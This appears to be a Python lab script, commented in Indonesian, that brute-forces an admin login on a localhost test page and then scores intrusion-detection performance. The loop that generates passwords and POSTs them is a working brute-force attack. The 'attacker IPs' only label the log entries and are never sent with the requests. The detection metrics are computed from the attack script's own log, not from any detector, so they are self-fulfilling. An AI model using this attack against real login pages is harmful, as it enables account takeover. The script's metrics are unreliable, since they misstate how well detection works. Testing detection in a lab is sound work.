import requests
import time
import itertools
import string
import json
import os
from datetime import datetime
import psutil

# === KONFIGURASI ===
url = "http://localhost/web_attack/login.php"
email = "admin@gmail.com"

HONEYPOT_LOG = r"C:\test-cicd\log_ids\bf_metrics.json"
METRICS_RESULT = r"C:\test-cicd\log_ids\evaluation_metrics_bf.json"
max_length = 2
timeout_request = 2
delay = 0

# --- DAFTAR IP ATTACKER YANG INGIN DISIMULASI ---
attacker_ips = [
    "192.168.100.50",
    "192.168.100.51",
    "192.168.100.52"
]

# Ground truth khusus Brute Force -> otomatis dari attacker_ips
GROUND_TRUTH = { ip: "Brute Force" for ip in attacker_ips }

# === VARIABEL UNTUK HASIL ===
successful_logins = []
near_matches = []
rate_limited = []
failed_attempts = 0
total_attempts = 0

# Monitoring CPU & RAM
cpu_usage_during = []
ram_usage_during = []

# === GENERATOR PASSWORD SISTEMATIS ===
def generate_passwords():
    digits = string.digits
    letters = string.ascii_lowercase
    alphanum = digits + letters

    for length in range(1, max_length + 1):
        for pw in itertools.product(digits, repeat=length):
            yield ''.join(pw)

    for length in range(1, max_length + 1):
        for pw in itertools.product(letters, repeat=length):
            yield ''.join(pw)

    for length in range(1, max_length + 1):
        for pw in itertools.product(alphanum, repeat=length):
            yield ''.join(pw)

# === TULIS LOG KE JSON ARRAY ===
def write_to_ids_log(ip, email, password, status):
    log_entry = {
        "waktu": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "ip": ip,
        "email": email,
        "password": password,
        "status": status,
        "jenis_serangan": "Brute Force",
        "waktu_mulai_serangan": start_time_str
    }
    if not os.path.exists(HONEYPOT_LOG):
        with open(HONEYPOT_LOG, "w", encoding="utf-8") as f:
            json.dump([log_entry], f, indent=4, ensure_ascii=False)
    else:
        with open(HONEYPOT_LOG, "r+", encoding="utf-8") as f:
            try:
                logs = json.load(f)
            except json.JSONDecodeError:
                logs = []
            logs.append(log_entry)
            f.seek(0)
            json.dump(logs, f, indent=4, ensure_ascii=False)

# === CATAT CPU & RAM SEBELUM SERANGAN ===
cpu_before = psutil.cpu_percent(interval=1)
ram_before = psutil.virtual_memory().percent

# === BRUTE FORCE LOGIN ===
start_time = time.time()
start_time_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

# siapkan cycle IP supaya berganti per percobaan (round-robin)
ip_cycle = itertools.cycle(attacker_ips)

for password in generate_passwords():
    total_attempts += 1

    # ambil fake/source ip untuk percobaan ini
    fake_ip = next(ip_cycle)

    # Catat CPU & RAM selama serangan
    cpu_usage_during.append(psutil.cpu_percent(interval=None))
    ram_usage_during.append(psutil.virtual_memory().percent)

    data = {"email": email, "password": password}

    try:
        response = requests.post(url, data=data, timeout=timeout_request)
        response_text = response.text.lower()

        if response.status_code == 429 or "too many requests" in response_text:
            print(f"[!] TERBATAS (Rate Limit) dari {fake_ip}: password '{password}' diblokir server")
            rate_limited.append((fake_ip, email, password))
            write_to_ids_log(fake_ip, email, password, "dibatasi")
            continue

        if "login berhasil" in response_text:
            print(f"[+] BERHASIL login dengan password: {password} (dari {fake_ip})")
            successful_logins.append((fake_ip, email, password))
            write_to_ids_log(fake_ip, email, password, "berhasil")
            break

        elif "hampir benar" in response_text:
            print(f"[~] Password '{password}' hampir benar! (dari {fake_ip})")
            near_matches.append((fake_ip, email, password))
            failed_attempts += 1
            write_to_ids_log(fake_ip, email, password, "hampir_benar")

        else:
            print(f"[-] Gagal login dengan password: {password} (dari {fake_ip})")
            failed_attempts += 1
            write_to_ids_log(fake_ip, email, password, "gagal")

    except Exception as e:
        print(f"[!] Error saat mencoba password '{password}' dari {fake_ip}: {e}")
        failed_attempts += 1
        write_to_ids_log(fake_ip, email, password, "error")

    time.sleep(delay)

# === CATAT CPU & RAM SETELAH SERANGAN ===
cpu_after = psutil.cpu_percent(interval=1)
ram_after = psutil.virtual_memory().percent

# === RINGKASAN ===
end_time = time.time()
elapsed = round(end_time - start_time, 2)

print("\n=== RINGKASAN SERANGAN BRUTE FORCE ===")
print(f"Total percobaan         : {total_attempts}")
print(f"Jumlah berhasil         : {len(successful_logins)}")
print(f"Jumlah hampir benar     : {len(near_matches)}")
print(f"Jumlah dibatasi server  : {len(rate_limited)}")
print(f"Jumlah gagal            : {failed_attempts}")
print(f"Waktu eksekusi          : {elapsed} detik")
print(f"Log IDS tersimpan di    : {HONEYPOT_LOG}")

# === HITUNG METRIK OTOMATIS ===
def calculate_metrics():
    if not os.path.exists(HONEYPOT_LOG):
        print(f"[!] File tidak ditemukan: {HONEYPOT_LOG}")
        return

    with open(HONEYPOT_LOG, "r", encoding="utf-8") as f:
        logs = json.load(f)

    bf_logs = [log for log in logs if log.get("jenis_serangan") == "Brute Force"]
    detected = [(log.get("ip"), log.get("jenis_serangan")) for log in bf_logs]

    tp = sum(1 for ip, t in detected if GROUND_TRUTH.get(ip) == t)
    fp = sum(1 for ip, t in detected if ip in GROUND_TRUTH and GROUND_TRUTH.get(ip) != t)
    fn = sum(1 for ip, attack in GROUND_TRUTH.items() if (ip, attack) not in detected)

    tpr = tp / (tp + fn) if (tp + fn) else 0
    fpr = fp / (fp + tp) if (fp + tp) else 0
    fnr = fn / (tp + fn) if (tp + fn) else 0

    avg_detection_time = None
    detection_times = []
    for log in bf_logs:
        if log.get("ip") in GROUND_TRUTH:
            try:
                start_time_dt = datetime.strptime(log.get("waktu_mulai_serangan"), "%Y-%m-%d %H:%M:%S")
                detect_time = datetime.strptime(log.get("waktu"), "%Y-%m-%d %H:%M:%S")
                detection_times.append((detect_time - start_time_dt).total_seconds())
            except:
                pass
    if detection_times:
        avg_detection_time = round(sum(detection_times) / len(detection_times), 2)

    hasil = {
        "Jenis Serangan": "Brute Force",
        "True Positive Rate": round(tpr, 2),
        "False Positive Rate": round(fpr, 2),
        "False Negative Rate": round(fnr, 2),
        "CPU Sebelum (%)": cpu_before,
        "RAM Sebelum (%)": ram_before,
        "CPU Rata-rata Selama Serangan (%)": round(sum(cpu_usage_during) / len(cpu_usage_during), 2) if cpu_usage_during else None,
        "RAM Rata-rata Selama Serangan (%)": round(sum(ram_usage_during) / len(ram_usage_during), 2) if ram_usage_during else None,
        "CPU Setelah (%)": cpu_after,
        "RAM Setelah (%)": ram_after,
        "Rata-rata Waktu Deteksi (detik)": avg_detection_time,
        "Total Serangan Terdeteksi": len(bf_logs)
    }

    with open(METRICS_RESULT, "w", encoding="utf-8") as f:
        json.dump(hasil, f, indent=4, ensure_ascii=False)

    print("\n[📊 METRIK] Hasil evaluasi Brute Force tersimpan di:", METRICS_RESULT)
    print(json.dumps(hasil, indent=4, ensure_ascii=False))

calculate_metrics()
